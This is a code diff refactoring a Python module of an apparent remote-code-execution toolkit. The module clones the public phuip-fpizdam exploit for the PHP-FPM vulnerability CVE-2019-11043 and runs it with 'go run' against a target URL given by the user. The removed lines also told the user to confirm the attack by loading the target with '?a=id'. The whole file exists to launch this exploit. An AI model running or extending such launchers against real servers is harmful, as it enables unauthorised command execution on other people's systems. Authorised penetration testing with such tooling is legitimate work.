@@ -2,9 +2,10 @@
 Обёртка над neex/phuip-fpizdam.
 Требования: git, go (golang).
 """
-import sys, subprocess
 from pathlib import Path
+
 from framework import Module, C, require
+from poc_support import ensure_repo, run_checked
 
 REPO = "https://github.com/neex/phuip-fpizdam.git"
 WORK = Path.home() / ".rce-tool" / "phuip-fpizdam"
@@ -16,30 +17,18 @@ class CVE201911043(Module):
     author = "you"
 
     options = {
-        "TARGET": {"value": None, "required": True, "description": "Target URL, e.g. http://10.10.10.5/index.php"},
+        "TARGET": {
+            "value": None, "required": True, "kind": "url",
+            "description": "Target URL, e.g. http://10.10.10.5/index.php",
+        },
     }
 
-    def _ensure(self) -> bool:
-        if (WORK / "main.go").exists():
-            return True
-        WORK.parent.mkdir(parents=True, exist_ok=True)
-        print(f"{C.Y}[*] Cloning {REPO}{C.END}")
-        r = subprocess.run(["git", "clone", "--depth", "1", REPO, str(WORK)],
-                           capture_output=True, text=True)
-        if r.returncode != 0:
-            print(f"{C.R}[!] git clone failed: {r.stderr}{C.END}")
-            return False
-        return True
-
     def run(self):
-        miss = require("git", "go")
-        if miss:
-            print(f"{C.R}[!] Missing: {', '.join(miss)} (для сборки нужен Go){C.END}")
-            return
-        if not self._ensure():
-            return
+        if require("go"):
+            raise RuntimeError("Go not found; install Go to build this PoC")
+        ensure_repo(REPO, WORK, "main.go")
         target = self.get("TARGET")
         cmd = ["go", "run", ".", target]
-        print(f"{C.Y}[*] Running: {' '.join(cmd)}{C.END}")
-        print(f"{C.DIM} После атаки проверь {target}?a=id{C.END}")
-        subprocess.run(cmd, cwd=str(WORK))
+        print(f"{C.Y}[*] Running PHP-FPM PoC{C.END}")
+        run_checked(cmd, cwd=WORK)
+        print(f"{C.DIM}[*] PoC exited successfully; review its output.{C.END}")
